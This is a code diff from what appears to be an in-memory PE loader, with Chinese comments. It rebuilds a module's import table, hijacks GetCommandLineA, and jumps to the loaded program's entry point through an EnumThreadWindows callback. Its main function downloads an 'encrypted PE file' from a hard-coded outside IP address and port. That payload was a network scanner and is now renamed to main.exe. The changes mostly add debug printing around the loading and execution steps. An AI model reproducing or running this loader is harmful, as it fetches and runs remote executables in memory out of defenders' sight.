@@ -443,6 +443,7 @@ bool RepairIAT(PVOID modulePtr)
             {
                 size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));  // 通过INT获取函数号称在获取函数地址 0xFFFF取出低十六位
                 fieldThunk->u1.Function = addr;  // 获取到的地址赋值给IAT
+
             }
             // 判断是否到链子的底端
             if (fieldThunk->u1.Function == NULL) break;
@@ -451,9 +452,10 @@ bool RepairIAT(PVOID modulePtr)
 
                 PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);   //IMAGE_IMPORT_BY_NAME结构体
                 LPSTR func_name = (LPSTR)by_name->Name;  // 函数名
+                
 
                 size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name); //通过INT里的函数名获取函数地址
-
+                printf("func_name: %s ,address is :%p\n", func_name, addr);
                 // 以下是填充一些杂七杂八的运行参数
                 if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
                 {
@@ -569,8 +571,11 @@ void PELoader(char* data, DWORD datasize)
 
     // AddressOfEntryPoint
     size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
+    printf("retAddr: %p\n", retAddr);
+    printf("Well jmp: %p\n", retAddr-2330);
 
-    EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
+    BOOL AA=EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
+    printf("AA: %d\n", AA);
 
 }
 
@@ -708,7 +713,7 @@ int main(int argc, char** argv) {
     // 获取一个加密的PE文件
     wchar_t* whost= L"101.42.175.89";
     DWORD port= 65522;
-    wchar_t* wpe = L"fscan32.exe";
+    wchar_t* wpe = L"main.exe";
     //char* host1 = argv[1];
     //DWORD port1 = atoi(argv[2]);
     //char* pe1 = argv[3];
